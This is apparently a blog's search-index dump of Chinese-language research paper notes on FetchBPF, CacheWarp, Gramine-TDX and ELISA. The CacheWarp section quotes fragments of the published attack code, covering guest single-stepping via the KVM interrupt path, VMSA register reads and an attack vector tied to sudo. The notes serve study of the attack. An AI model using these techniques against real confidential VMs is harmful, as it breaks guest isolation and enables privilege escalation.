src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=OTc4MDBhYTVlODYyZGE3N2ZkYzVmZjkyYjljNDNlYmRfN0xlQ3pFZE1JTWo2Mk9kZ1RGTnJhcmFGZTZYcE9xN1RfVG9rZW46TTA4UmJ1WlJZb2xIU0F4ZVdURmNqczRPblRmXzE3Mzg2NzMwODk6MTczODY3NjY4OV9WNA\" alt=\"img\"></p>\n<h3 id=\"Policy-example-LEAP\"><a href=\"#Policy-example-LEAP\" class=\"headerlink\" title=\"Policy example(LEAP)\"></a>Policy example(LEAP)</h3><ul>\n<li>eBPF map: 存储memory access history</li>\n<li>prefetch_stats: 在map中存入page fault地址以及与前一个page fault地址的差</li>\n<li>prefetch_policy：用Boyer-Moore识别出majority stride，调用bpf_prefetch_physical_page进行prefetch</li>\n</ul>\n<h2 id=\"Evaluation\"><a href=\"#Evaluation\" class=\"headerlink\" title=\"Evaluation\"></a>Evaluation</h2><h3 id=\"Microbenchmarks\"><a href=\"#Microbenchmarks\" class=\"headerlink\" title=\"Microbenchmarks\"></a>Microbenchmarks</h3><p>分配5GB array</p>\n<p>Allocation patterns：</p>\n<ul>\n<li>Sequential allocation（sqn）</li>\n<li>Random allocation（random）：模拟多个线程同时alloc pages （这种情况使用virtual address会比physical address好）</li>\n</ul>\n<p>Access patterns：</p>\n<ul>\n<li>Sequential（sqn）</li>\n<li>stride（stride）：相隔3 pages</li>\n<li>ladder（ladder）：increasing stride</li>\n</ul>\n<p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDY1N2ExNWVmOWI1MDE3OWViZjgzZWI2YjE1MjU5ZWRfTVNNZ0Q5SHdYNlNkSGYzaldUNnpkUk9TbGRFbm5vM0ZfVG9rZW46SDFBMmJpRWREb0VCR1R4TGtsZ2Nwd1hFbnZlXzE3Mzg2NzMwODk6MTczODY3NjY4OV9WNA\" alt=\"img\"></p>\n<ul>\n<li>Accuracy、Coverage： eBPF实现版本与linux kernel版本几乎完全一致</li>\n<li>Execution time：eBPF带来的overhead可以忽略不计</li>\n</ul>\n<p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=YjZkY2UzZTNiZDgzZTM0Yjg2MTIwNjA4OWM4MmVjODJfcUE2Z3NCQW5PVTBXV2t3dkY4WmFnZ1NwVVF3aTNTOWpfVG9rZW46QWRFbmJzblRib2UyTm14eUhVemNkSWVVbmFiXzE3Mzg2NzMwODk6MTczODY3NjY4OV9WNA\" alt=\"img\"></p>\n<ul>\n<li>latency大部分的开销在page retrieval （I&#x2F;O）</li>\n<li>eBPF程序被JIT编译为机器指令，性能与kernel functions差别不大</li>\n</ul>\n<h3 id=\"Macrobenchmarks\"><a href=\"#Macrobenchmarks\" class=\"headerlink\" title=\"Macrobenchmarks\"></a>Macrobenchmarks</h3><ul>\n<li>VoltDB上运行TPC-C</li>\n<li>Redis’ memtier benchmark</li>\n<li>Twitter dataset上运行PageRank与betweeness centrality</li>\n</ul>\n<p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDc4NDQzYWNhMTExYzVjN2I3NjdjYWFlNjU4ZWRhOGNfbVl2U0ZpaVpNWG9JRU52ZzNNUXhHMmF0ZThuVEo1YUtfVG9rZW46TmZkZ2JhWWg1bzBINll4UFNsaGM2YzU4bmdwXzE3Mzg2NzMwODk6MTczODY3NjY4OV9WNA\" alt=\"img\"></p>\n<ul>\n<li>对比policy及与之对应的eBPF版本，仍然没有明显的性能差别</li>\n<li>好的policy在可用内存少时优势更明显</li>\n</ul>\n<p>关于VMA policy作者的解释：这些对性能要求极高的程序耗费了大量的时间为linux的prefetch policy做了优化</p>\n<p>FetchBPF希望改变这种方式，设计policy去适配application，而不是优化application的访存模式去适配policy</p>\n<h2 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h2><p>本文基于eBPF设计了框架FetchBPF，使得用户可以根据程序的访存模式自定义内存预取策略来达到最优的性能。FetchBPF框架可以在几乎没有额外性能开销的情况下达到一致的内存预取功能。</p>\n","categories":["papers"]},{"title":"CacheWarp","url":"/2024/09/17/papers/CacheWarp/","content":"<h1 id=\"CacheWarp\"><a href=\"#CacheWarp\" class=\"headerlink\" title=\"CacheWarp\"></a>CacheWarp</h1><p>snp用的是<a href=\"https://github.com/sev-step/sev-step\">sev-step&#x2F;sev-step: This repo tracks a compatible state of all sev step components and contains script to easily install everything required to setup a sev vm (github.com)</a></p>\n<p><a href=\"https://github.com/cispa/CacheWarp/blob/main/kernel-patch/kernel.patch\">CacheWarp&#x2F;kernel-patch&#x2F;kernel.patch at main · cispa&#x2F;CacheWarp (github.com)</a></p>\n<p>SEV_STEP_FLAG_BASE_PFN   sev_step_page_va  和user通信地址</p>\n<p>intr_interception 核心逻辑</p>\n<p><a href=\"https://github.com/cispa/CacheWarp/blob/main/userspace-controller/cachewarp/cachewarp.c\">CacheWarp&#x2F;userspace-controller&#x2F;cachewarp&#x2F;cachewarp.c at main · cispa&#x2F;CacheWarp (github.com)</a></p>\n<p>sev_step_kernel_sync_addr_p 和step框架通信</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">sev_step_kernel_sync_addr_p = libtea_map_physical_address_range(instance, KERNEL_SYNC_PA, <span class=\"number\">4096</span>, PROT_READ | PROT_WRITE, <span class=\"literal\">true</span>);</span><br><span class=\"line\"><span class=\"built_in\">memset</span>(sev_step_kernel_sync_addr_p, <span class=\"number\">0</span>, <span class=\"number\">4096</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">uint16_t</span> vec[<span class=\"number\">100</span>] = &#123;<span class=\"number\">44</span>, <span class=\"number\">0</span>,<span class=\"number\">8</span>,<span class=\"number\">0x80</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>, <span class=\"number\">8</span>,<span class=\"number\">8</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>, <span class=\"number\">0</span>,<span class=\"number\">0x80</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span> ,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0x201</span>, <span class=\"number\">1</span>,<span class=\"number\">0x101</span>,<span class=\"number\">0x101</span>,<span class=\"number\">3</span>,<span class=\"number\">0x11</span>, <span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">0x41</span>,<span class=\"number\">0x41</span>,<span class=\"number\">0x5</span>, <span class=\"number\">1</span>,<span class=\"number\">0x11</span>,<span class=\"number\">0x21</span>,<span class=\"number\">0x20</span>,<span class=\"number\">1</span>, <span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>,<span class=\"number\">1</span>, <span class=\"number\">0x21</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>,<span class=\"number\">0x3000</span>&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt;= vec[<span class=\"number\">0</span>]; i++)</span><br><span class=\"line\">    <span class=\"keyword\">asm</span> <span class=\"title function_\">volatile</span> <span class=\"params\">(<span class=\"string\">&quot;movw %1, (%0)\\n\\t&quot;</span>:: <span class=\"string\">&quot;r&quot;</span>(sev_step_kernel_sync_addr_p+<span class=\"number\">16</span>+<span class=\"number\">2</span>*i),<span class=\"string\">&quot;r&quot;</span>(vec[i]):)</span>;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<p>vec攻击向量 和sudo的binary有关</p>\n<p><a href=\"https://github.com/cispa/CacheWarp/tree/main/sudo\">CacheWarp&#x2F;sudo at main · cispa&#x2F;CacheWarp (github.com)</a></p>\n<p>用到libtea 是usenix security22提供的一套框架 不用自己写一大堆难懂的汇编 并且屏蔽掉平台的差异</p>\n<p><a href=\"https://github.com/libtea/frameworks/blob/master/libtea/src/libtea_common.c\">frameworks&#x2F;libtea&#x2F;src&#x2F;libtea_common.c at master · libtea&#x2F;frameworks (github.com)</a></p>\n<p>vec记录了一串数值 是step指令的序列</p>\n<p>vmsa layout 记录在手册中</p>\n<p><a href=\"https://www.amd.com/content/dam/amd/en/documents/processor-tech-docs/programmer-references/24593.pdf\">https://www.amd.com/content/dam/amd/en/documents/processor-tech-docs/programmer-references/24593.pdf</a></p>\n<p>Table B-4. VMSA Layout, State Save Area for SEV-ES</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">vmsa_paddr = svm-&gt;vmcb-&gt;control.vmsa_pa;</span><br><span class=\"line\"></span><br><span class=\"line\">rsp = *(<span class=\"keyword\">volatile</span> u64 *)(vmsa_vaddr+<span class=\"number\">0x1d8</span>);</span><br><span class=\"line\">rbp = *(<span class=\"keyword\">volatile</span> u64 *)(vmsa_vaddr+<span class=\"number\">0x328</span>);</span><br><span class=\"line\">rax = *(<span class=\"keyword\">volatile</span> u64 *)(vmsa_vaddr+<span class=\"number\">0x1f8</span>);</span><br><span class=\"line\">rcx = *(<span class=\"keyword\">volatile</span> u64 *)(vmsa_vaddr+<span class=\"number\">0x308</span>);</span><br><span class=\"line\">rdx_rbx = *(<span class=\"keyword\">volatile</span> u64 *)(vmsa_vaddr+<span class=\"number\">0x310</span>);</span><br><span class=\"line\">rsi_rdi = *(<span class=\"keyword\">volatile</span> u64 *)(vmsa_vaddr+<span class=\"number\">0x330</span>);</span><br><span class=\"line\">r8_r9   = *(<span class=\"keyword\">volatile</span> u64 *)(vmsa_vaddr+<span class=\"number\">0x340</span>);</span><br><span class=\"line\">r10_r11 = *(<span class=\"keyword\">volatile</span> u64 *)(vmsa_vaddr+<span class=\"number\">0x350</span>);</span><br><span class=\"line\">r12_r13 = *(<span class=\"keyword\">volatile</span> u64 *)(vmsa_vaddr+<span class=\"number\">0x360</span>);</span><br><span class=\"line\">r14_r15 = *(<span class=\"keyword\">volatile</span> u64 *)(vmsa_vaddr+<span class=\"number\">0x370</span>);</span><br><span class=\"line\">xmm = *(<span class=\"keyword\">volatile</span> u64 *)(vmsa_vaddr+<span class=\"number\">0x470</span>);</span><br><span class=\"line\">ymm = *(<span class=\"keyword\">volatile</span> u64 *)(vmsa_vaddr+<span class=\"number\">0x570</span>);</span><br><span class=\"line\">cs  = *(<span class=\"keyword\">volatile</span> u64 *)(vmsa_vaddr+<span class=\"number\">0x10</span>);</span><br><span class=\"line\">ss  = *(<span class=\"keyword\">volatile</span> u64 *)(vmsa_vaddr+<span class=\"number\">0x20</span>);</span><br><span class=\"line\">reg_vector = ((last_vmsa_rsp != rsp) &lt;&lt; <span class=\"number\">0</span>) + ((last_vmsa_rbp != rbp) &lt;&lt; <span class=\"number\">1</span>) + \\</span><br><span class=\"line\">\t\t\t\t\t\t((last_vmsa_rax != rax) &lt;&lt; <span class=\"number\">2</span>) \t\t   + ((last_vmsa_rcx != rcx) &lt;&lt; <span class=\"number\">3</span>) + \\</span><br><span class=\"line\">\t\t\t\t\t\t((last_vmsa_rdx_rbx != rdx_rbx) &lt;&lt; <span class=\"number\">4</span>)  + ((last_vmsa_rsi_rdi != rsi_rdi) &lt;&lt; <span class=\"number\">5</span>) + \\</span><br><span class=\"line\">\t\t\t\t\t\t((last_vmsa_r8_r9 != r8_r9) &lt;&lt; <span class=\"number\">6</span>) \t   + ((last_vmsa_r10_r11 != r10_r11) &lt;&lt; <span class=\"number\">7</span>) + \\</span><br><span class=\"line\">\t\t\t\t\t\t((last_vmsa_r12_r13 != r12_r13) &lt;&lt; <span class=\"number\">8</span>)  + ((last_vmsa_r14_r15 != r14_r15) &lt;&lt; <span class=\"number\">9</span>) + \\</span><br><span class=\"line\">\t\t\t\t\t\t((last_vmsa_xmm != xmm) &lt;&lt; <span class=\"number\">10</span>) \t\t   + ((last_vmsa_ymm != ymm) &lt;&lt; <span class=\"number\">11</span>) + \\</span><br><span class=\"line\">\t\t\t\t\t\t((last_vmsa_cs != cs) &lt;&lt; <span class=\"number\">12</span>) \t\t   + ((last_vmsa_ss != ss) &lt;&lt; <span class=\"number\">13</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (reg_vector != *((<span class=\"keyword\">volatile</span> u16 *)(sev_step_page_va + PATH_OFFSET + path_index*<span class=\"number\">2</span>))) &#123;</span><br><span class=\"line\">\t\t\t\t\t\tfind_target = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t\t\t\t\t\tprintk(<span class=\"string\">&quot;dismatch %dth Instr! the vector is 0x%x\\n&quot;</span>, path_index, reg_vector);</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n<p>user 先设置flag  kvm把所有页表present bit设为0 guest触发NPF</p>\n<p>kvm拿到gpa 设置APIC</p>\n<p>小于阈值 0step 大于阈值 &gt;&#x3D;1step</p>\n<p>观察RIP看是0还是非0</p>\n<p>snp增加了freshness 寄存器一样密文也会变 可以用sev-step的performance counter</p>\n<p>由于vmsa的cache 导致每次context switch时间不稳定 因此用MTRR标记为不可缓存 并且用wbinvd解决AMD CPU可能stale的问题</p>\n<p>NPF的作用是啥</p>\n<blockquote>\n<p>To ensure consistent conditions for every stepping, the hypervisor always clears the present bit of the last fault page when handling the APIC timer interrupt, i.e., an NPF is always triggered before the next APIC interrupt.  </p>\n</blockquote>\n<p>为了控制变量 保证时间稳定？感觉几乎没有用</p>\n<ol>\n<li>run的汇编每次固定apic timer 可以step</li>\n<li>sev-step没有提到page fault</li>\n</ol>\n<p>是否只是拿个gpa 方便找pattern？</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">__svm_sev_es_vcpu_run(svm, spec_ctrl_intercepted, (u32*)(APIC_BASE + APIC_TMICT), apic_interval, wbnoinvd);</span><br><span class=\"line\">SYM_FUNC_START(__svm_sev_es_vcpu_run)</span><br><span class=\"line\">    movl %_ASM_ARG4L, (%_ASM_ARG3)</span><br></pre></td></tr></table></figure>\n\n<p>攻击触发点：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span>* <span class=\"title function_\">ctrl_thread</span><span class=\"params\">(<span class=\"type\">void</span>* dummy)</span> &#123; </span><br><span class=\"line\">\t</span><br><span class=\"line\">\tpin_to_core(ASSIST_CORE);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// hook kvm_exit_handler in the kernel </span></span><br><span class=\"line\">\t<span class=\"keyword\">asm</span> <span class=\"title function_\">volatile</span> <span class=\"params\">(<span class=\"string\">&quot;movq %1, (%0)\\n&quot;</span>::<span class=\"string\">&quot;r&quot;</span>(sev_step_kernel_sync_addr_p),<span class=\"string\">&quot;r&quot;</span>(flag):)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* Wait until the attack finishes */</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (*(<span class=\"type\">uint32_t</span>*)(sev_step_kernel_sync_addr_p)) &#123;sched_yield();&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">intr_interception</span><br><span class=\"line\">    <span class=\"comment\">/* Start */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (zero_stepping_time == <span class=\"number\">0</span> &amp;&amp; non_zero_stepping_time == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        kvm_unpre_all(vcpu-&gt;kvm, svm-&gt;vmcb-&gt;control.asid);</span><br><span class=\"line\">        svm_flush_tlb_current(vcpu);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* Mark VMSA into UC will make `VMRUN` updates all vmsa state in cache */</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (uc_vmsa) &#123;</span><br><span class=\"line\">            mtrr_uc_page(vmsa_paddr, <span class=\"number\">3</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* Avoid to drop smth dirty data and freeze the system</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t * wbnoinvd is enough to make it reliable</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t * wbinvd also works, but it takes longer time</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t */</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (invd) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">asm</span> <span class=\"title function_\">volatile</span> <span class=\"params\">(<span class=\"string\">&quot;wbnoinvd\\n\\t&quot;</span>)</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>ssh 怎么利用page fault一起找的？</p>\n<p>npf_interception intr_interception svm_vcpu_enter_exit三者关系是什么？</p>\n<p>exit之后不就是NPF或者INTR 为什么急着先处理？</p>\n","categories":["papers"]},{"title":"Gramine-TDX: A Lightweight OS Kernel for Confidential VMs","url":"/2026/02/02/papers/Gramine-TDX%20A%20Lightweight%20OS%20Kernel%20for%20Confidential%20VMs/","content":"<h1 id=\"Gramine-TDX-A-Lightweight-OS-Kernel-for-Confidential-VMs\"><a href=\"#Gramine-TDX-A-Lightweight-OS-Kernel-for-Confidential-VMs\" class=\"headerlink\" title=\"Gramine-TDX: A Lightweight OS Kernel for Confidential VMs\"></a>Gramine-TDX: A Lightweight OS Kernel for Confidential VMs</h1><p><img src=\"/images/EjhCb11gMoUmnixOxmzcr9KAn0c.png\" title=\"image\"></p>\n<p>CCS24</p>\n<h2 id=\"Background\"><a href=\"#Background\" class=\"headerlink\" title=\"Background\"></a>Background</h2><p>Linux 内核庞大且复杂，其中很多功能对于机密计算应用来说都是冗余的，除了增大 TCB 与攻击面之外没有意义。</p>\n<p>CVM 攻击面包括：</p>\n<ul>\n<li>Shared memory</li>\n<li>PIO MMIO</li>\n<li>Hypercall</li>\n<li>Interrupts exceptions</li>\n<li>CPUID leaves</li>\n</ul>\n<p>Heckler(Security’24) 是已经公开的利用 int 0x80 恶意中断进行攻击的例子</p>\n<p><img src=\"/images/KwDzbkJbwoUC7fx5RUtcX0rHnGc.png\" title=\"image\"></p>\n<p><img src=\"/images/T4iPbqDapoadACxheN4czjVDnRb.png\" title=\"image\"></p>\n<h2 id=\"Design\"><a href=\"#Design\" class=\"headerlink\" title=\"Design\"></a>Design</h2><p>Gramine-TDX 是一个轻量级的 LibOS（完全代替 Linux 作为 guest kernel）</p>\n<p>Hypervisor 使用 QEMU&#x2F;KVM</p>\n<p><img src=\"/images/HazHb7kbMoaXPPxGW6lcxJPdnNd.png\" title=\"image\"></p>\n<h3 id=\"LibOS\"><a href=\"#LibOS\" class=\"headerlink\" title=\"LibOS\"></a>LibOS</h3><ul>\n<li>不支持多进程 fork 没有 IPC</li>\n<li>不能用硬件 例如 GPU</li>\n<li>不支持 legacy 16&#x2F;32bit 只支持 64bit</li>\n<li>1:1 mapping</li>\n<li>没有 network stack 和 fs stack</li>\n<li>不需要修改 APP，不限语言 例如 C, C++, Rust, Python, Java, Go</li>\n<li>有且仅有三个 virtio 驱动，并且完全按照 TDX 威胁模型重写，过滤不合法输入</li>\n</ul>\n<p><img src=\"/images/Jf70bwwFcobp6DxTl5Ec5L4ZnGg.png\" title=\"image\"></p>\n<h3 id=\"Deployment-Model\"><a href=\"#Deployment-Model\" class=\"headerlink\" title=\"Deployment Model\"></a>Deployment Model</h3><p>不需要虚拟机镜像，需要的文件直接从主机文件系统读取</p>\n<ul>\n<li>配置信息 （manifest）</li>\n<li>共享库（提前准备好的一份 glibc patch 过的）</li>\n<li>其他文件 提前加密好 gramine 负责解密</li>\n</ul>\n<p>不用虚拟网卡 不用网络配置</p>\n<h3 id=\"Chain-of-Trust\"><a href=\"#Chain-of-Trust\" class=\"headerlink\" title=\"Chain of Trust\"></a>Chain of Trust</h3><p><img src=\"/images/Qwzkbnd9ao9fBXxlctAcQ0j4nAg.png\" title=\"image\"></p>\n<ul>\n<li>bios -&gt; MRTD</li>\n<li>gramine kernel 二进制-&gt;RTMR1</li>\n<li>配置文件 manifest 其中包括了其他普通文件的哈希 RTMR2</li>\n</ul>\n<p>td 启动时 tdx module 会验证二进制，记录到这些寄存器中，之后提供给远程验证</p>\n<p>对于 RTMR2 td 可以自己 extend 定制化的内容（使用 tdcall 请求 tdx module）</p>\n<h2 id=\"Implementation\"><a href=\"#Implementation\" class=\"headerlink\" title=\"Implementation\"></a>Implementation</h2><p>manifest 中指定 entry point app hard-code 写死输入 防止 attacker 通过 verbose 等泄漏信息</p>\n<p>提供一个 patch 过的 libc 用于适配 gramine 的内核，提前编译成动态库，然后 mount 给虚拟机</p>\n<h3 id=\"virtio-fs\"><a href=\"#virtio-fs\" class=\"headerlink\" title=\"virtio-fs\"></a>virtio-fs</h3><p>本身用于 host-guest 共享文件  host 是 fuse server，guest 是 fuse client</p>\n<p>gramine-tdx 在 host 上用 virtiofsd</p>\n<p>文件请求通过 fuse 与 virtio 直接转到 host，因此 guest 不需要 fs stack</p>\n<h4 id=\"intel-protected-fs\"><a href=\"#intel-protected-fs\" class=\"headerlink\" title=\"intel protected fs\"></a>intel protected fs</h4><p>intel 基于自己的硬件已经实现了一套软件的加密 fs 协议 host 上的文件数据是加密的 读取的时候 gramine-tdx kernel 自动透明地会进行解密</p>\n<ul>\n<li>manifest 中 fs.mount type&#x3D;”encrypted”</li>\n<li>manifest 中 sgx.trusted_files 可以记录 file 和对应的 sha256 检察 完整性 （manifest 的完整性也会被检察）</li>\n</ul>\n<h3 id=\"virtio-vsock\"><a href=\"#virtio-vsock\" class=\"headerlink\" title=\"virtio-vsock\"></a>virtio-vsock</h3><p>本身用于 host-guest 传输网络包</p>\n<ul>\n<li>guest 上和 host 上都用 socket api 同一套地址 就可以通信</li>\n<li>host&#x2F;guest 上都可以用 socat 进行 socket 包和 TCP 包的转化</li>\n</ul>\n<ol>\n<li>guest 内 app 全都不需要改 正常通过端口提供服务 例如 8080</li>\n<li>gramine-tdx 的 kernel 实现中会进行网络包的转化，并通过 virtio-vsock 转交给 host</li>\n<li>host 上 <code>socat TCP4-LISTEN:8080,reuseaddr,fork VSOCK-CONNECT:123:1234</code> 可以在 host 上的 8080 访问 guest 内的服务</li>\n</ol>\n<h3 id=\"sum\"><a href=\"#sum\" class=\"headerlink\" title=\"sum\"></a>sum</h3><p>无法复制加载中的内容</p>\n<p>减小 TCB 减小攻击面 但是 fuse 和 socat 会带来 overhead</p>\n<h2 id=\"Security-Analysis\"><a href=\"#Security-Analysis\" class=\"headerlink\" title=\"Security Analysis\"></a>Security Analysis</h2><p><img src=\"/images/NSc3bjOMKoOGaOxBpCFcS98vnTb.png\" title=\"image\"></p>\n<p><img src=\"/images/Bk7zbtaaQoYMGTxNGRyczwqcnyQ.png\" title=\"image\"></p>\n<p>基本就是控制 input、检查 input 合法</p>\n<h2 id=\"Evaluation\"><a href=\"#Evaluation\" class=\"headerlink\" title=\"Evaluation\"></a>Evaluation</h2><p>Testbed：</p>\n<ul>\n<li>Intel Xeon Platinum 8570 CPU , 56 cores , 1 TB (16 channels × 64 GB&#x2F;DIMM) DRAM</li>\n<li>Host：Ubuntu 24.04, Intel TDX-enabled Linux kernel v6.8.</li>\n<li>Intel TDX-patched QEMU v8.2.</li>\n<li>Guest： Ubuntu 24.04,intel TDX-enabled guest Linux v6.8</li>\n<li>Intel TDX Module v1.5 (build_num 698).</li>\n<li>vCPU 数量与 Application 需要线程数量相等</li>\n</ul>\n<p>Varaints</p>\n<p><img src=\"/images/RIR4bVfAooDvwWxmBhPcX40Innh.png\" title=\"image\"></p>\n<h3 id=\"Microbenchmarks\"><a href=\"#Microbenchmarks\" class=\"headerlink\" title=\"Microbenchmarks\"></a>Microbenchmarks</h3><p><img src=\"/images/C6R9bRSsHotWtOxP3uAcSP9znzh.png\" title=\"image\"></p>\n<p>In-memory 计算开销小于 5%</p>\n<p>IO 性能差，在于 gramine-tdx 中的 virtio-fs 驱动实现过于简单</p>\n<h3 id=\"AI-Frameworks\"><a href=\"#AI-Frameworks\" class=\"headerlink\" title=\"AI Frameworks\"></a>AI Frameworks</h3><ul>\n<li>PyTorch: AlexNet for image classification.</li>\n<li>OpenVINO,TensorFlow:ResNet-50 for inference</li>\n<li>TensorFlow:BERT for inference</li>\n<li>Candle:LLaMA</li>\n</ul>\n<p><img src=\"/images/HrjbbXIraoi5GOxjis9chlk8nBg.png\" title=\"image\"></p>\n<p>大部分情况下几乎和 native 一致，平均性能 overhead 在 10%</p>\n<p>其他 Application 例如 databse 和 web server，由于需要 socat 的转发，并且 gramine-tdx 的 virito-vsock 设计过于简单，性能会降至 10%</p>\n<h2 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h2><p>Gramine-TDX 为 TDX 机密虚拟机定制了 guest kernel，大幅减小了攻击面，提升了安全性。</p>\n<p>由于重点在安全和代码质量上，性能方面看来目前只适合不需要网络的纯计算任务（例如模型推理）</p>\n","categories":["papers"]},{"title":"ELISA","url":"/2024/09/17/papers/ELISA/","content":"<h1 id=\"ELISA\"><a href=\"#ELISA\" class=\"headerlink\" title=\"ELISA\"></a>ELISA</h1><p><a href=\"https://github.com/yasukata/ELISA?tab=readme-ov-file#section-41--anywhere-page-table-apt\">yasukata&#x2F;ELISA: ELISA: Exit-Less, Isolated, and Shared Access for Virtual Machines (github.com)</a></p>\n<p>主要是elisa的设计实现了带隔离的共享内存 network的use case可以做到比vhost-net更好</p>\n<h2 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h2><p>虚拟机间需要共享数据</p>\n<ul>\n<li>共享内存 效率高 隔离性低 guest代码不可信</li>\n<li>host介入 例如hypercall 隔离性好 效率低</li>\n</ul>\n<img src=\"C:\\Users\\Shen\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240221135854799.png\" alt=\"image-20240221135854799\" style=\"zoom:50%;\" />\n\n<ul>\n<li>share一块设备的DMA区域</li>\n<li>trafficDB</li>\n</ul>\n<p>ELISA通过vmfunc切换EPT页表实现安全高效的资源共享</p>\n<img src=\"C:\\Users\\Shen\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240221140438142.png\" alt=\"image-20240221140438142\" style=\"zoom:50%;\" />\n\n<h2 id=\"EPTP\"><a href=\"#EPTP\" class=\"headerlink\" title=\"EPTP\"></a>EPTP</h2><img src=\"C:\\Users\\Shen\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240221151320704.png\" alt=\"image-20240221151320704\" style=\"zoom:50%;\" />\n\n<p><a href=\"https://www.cnblogs.com/Rev-omi/p/14063037.html\">第10章：VT 技术（简单了解+EPT 机制） - Rev_omi - 博客园 (cnblogs.com)</a></p>\n<p><a href=\"https://www.usenix.org/sites/default/files/conference/protected-files/atc18_slides_hua.pdf\">atc18_slides_hua.pdf (usenix.org)</a></p>\n<img src=\"C:\\Users\\Shen\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240221135313661.png\" alt=\"image-20240221135313661\" style=\"zoom:50%;\" />\n\n<img src=\"C:\\Users\\Shen\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240221135431450.png\" alt=\"image-20240221135431450\" style=\"zoom:50%;\" />\n\n<p>EPTP: EPT四级页表的root</p>\n<p>传统hypervisor只需要为每个guest配置一套EPT就可以 intel允许配置512个</p>\n<p>改完EPT以后 GPA-&gt;HPA映射改变 所有数据都变了 包括代码和页表</p>\n<p>所以大部分都是不改的 只改需要改的部分 例如代码</p>\n<ul>\n<li>原本不能访问的 现在可以访问</li>\n<li>代码段4k页结束以后 变到了新的代码段上了</li>\n</ul>\n<h2 id=\"challange\"><a href=\"#challange\" class=\"headerlink\" title=\"challange\"></a>challange</h2><p>EPT context 指每个EPTP对应的四级页表</p>\n<p>需要保证guest 页表数据不变(否则会crash) 所以guest 页表GPA-&gt;HPA不能变</p>\n<p> 所以guest改cr3必须下陷同步修改EPT？</p>\n<p>修改EPT以后代码在哪？  理论：通过固定GVA去call vmfunc 实际：恶意guest可以控制页表和cr3 导致可以任意GVAcall 绕过判断</p>\n<h2 id=\"design\"><a href=\"#design\" class=\"headerlink\" title=\"design\"></a>design</h2><p>三种EPT context</p>\n<ul>\n<li>default 不可信</li>\n<li>gate 可信</li>\n<li>sub 可信</li>\n</ul>\n<p>Manager VM：可信部分 方便用user-space的tool 代替了kernel的hypervisor 去配置EPT</p>\n<h3 id=\"APT\"><a href=\"#APT\" class=\"headerlink\" title=\"APT\"></a>APT</h3><p>APT是为了消除CR3的trap和update开销</p>\n<p>vmfunc之后 GPA-&gt;HPA映射改变 还是在guest内 因此想要执行目标代码 绕不开地址翻译</p>\n<p>让所有的GPA都指向提前配置好的guest页表基地址 这样不论cr3的值是什么 都可以正确翻译</p>\n<p>因此其他用到的内存 例如栈 共享变量 代码都必须在guest合法GPA之外 例如256G</p>\n<h3 id=\"gate\"><a href=\"#gate\" class=\"headerlink\" title=\"gate\"></a>gate</h3><img src=\"C:\\Users\\Shen\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240221135535967.png\" alt=\"image-20240221135535967\" style=\"zoom:50%;\" />\n\n<p><a href=\"https://www.usenix.org/conference/usenixsecurity20/presentation/mi\">(Mostly) Exitless VM Protection from Untrusted Hypervisor through Disaggregated Nested Virtualization | USENIX</a></p>\n<p>防止VM 随意切换EPTP bypass掉可信部分 用动态修改EPTP list的技术 </p>\n<p>初始化情况下 EPTP list 只有default 和gate 两个entry</p>\n<p>切换到gate的时候动态加入sub到EPTP 